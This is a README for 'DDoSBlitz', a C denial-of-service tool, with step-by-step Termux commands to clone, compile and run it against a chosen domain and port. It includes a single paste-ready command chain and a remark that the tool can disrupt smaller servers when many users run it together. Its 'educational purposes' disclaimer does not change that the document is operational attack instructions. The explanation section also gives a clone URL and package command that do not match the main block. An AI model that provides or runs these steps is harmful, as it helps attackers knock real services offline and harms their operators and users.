# DDoS Attack Tool

## Overview

DDoS (Distributed Denial of Service) is a type of cyberattack where an attacker attempts to disrupt the normal functioning of a targeted server, service, or network by overwhelming it with a flood of internet traffic. The DDoSBlitz tool, written in C, is an open-source utility designed to simulate a DDoS attack. This document provides detailed instructions for setting up and using DDoSBlitz on Termux.

## What is DDoSBlitz?

DDoSBlitz is an open-source DDoS attack tool implemented in the C programming language. It is used for educational purposes to demonstrate how DDoS attacks work. This tool is specifically designed to be used on Linux-based systems, including Termux on Android devices.

## Using DDoSBlitz with Termux

While Termux runs on a mobile device, it does not have the same power as a full server. As a result, DDoSBlitz may not be effective against large websites (e.g., Google, Facebook) but can still cause noticeable disruptions on smaller servers when used by multiple users simultaneously.

### Installation Steps

1. **Install Termux**

   Download and install Termux from the [Google Play Store](https://play.google.com/store/apps/details?id=com.termux) or [F-Droid](https://f-droid.org/packages/com.termux/).

2. **Update and Upgrade Termux Packages**

   Open Termux and execute the following commands to update and upgrade your package list:

   ```bash
   apt update
   apt upgrade
   ```

3. **Install Required Packages**

   Install `git` and `clang`, which are needed to clone and compile the DDoSBlitz tool:

   ```bash
   pkg install git
   pkg install clang
   ```

4. **Clone the DDoSBlitz Repository**

   Download the DDoSBlitz source code from GitHub:

   ```bash
   git clone https://github.com/New71k/DDoSBlitz
   ```

5. **Compile the DDoSBlitz Tool**

   Navigate to the DDoSBlitz directory and compile the source code:

   ```bash
   cd DDoSBlitz
   clang DDoSBlitz.c -o DDoSBlitz
   ```

6. **Run the DDoSBlitz Tool**

   Execute the compiled tool, specifying the target website and port number. Replace `www.example.com` with the target domain and `80` with the target port:

   ```bash
   ./DDoSBlitz www.example.com 80
   ```

### All Commands

The following block contains all the necessary commands to set up, compile, and execute the DDoSBlitz tool in Termux. Copy and paste these commands in sequence to perform the entire setup:

```bash
apt update && apt upgrade -y && pkg install git && pkg install clang -y && git clone https://github.com/New71k/DDoSBlitz &&cd DDoSBlitz && clang DDoSBlitz.c -o DDoSBlitz && ./DDoSBlitz www.example.com 80
```

**Explanation:**

- `apt update && apt upgrade -y`: Updates the package list and upgrades installed packages to the latest versions.
- `pkg install git clang -y`: Installs the `git` and `clang` packages required for cloning the repository and compiling the code.
- `git clone https://github.com/New71k/DDos/blob/main/DDoSBlitz.c`: Clones the repository containing the DDoSBlitz source code from GitHub.
- `cd DDoSBlitz`: Navigates to the directory where the source code is located.
- `clang DDoSBlitz.c -o DDoSBlitz`: Compiles the source code into an executable named `DDoSBlitz`.
- `./DDoSBlitz www.example.com 80`: Executes the DDoSBlitz tool with the specified target domain and port.

## Disclaimer

This tool is intended solely for educational purposes. Unauthorized use of DDoSBlitz or similar tools to attack servers or services without explicit permission is illegal and unethical. Always ensure you have proper authorization before conducting any tests.

## License

This code is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

## Credits

- **Author**: New71k
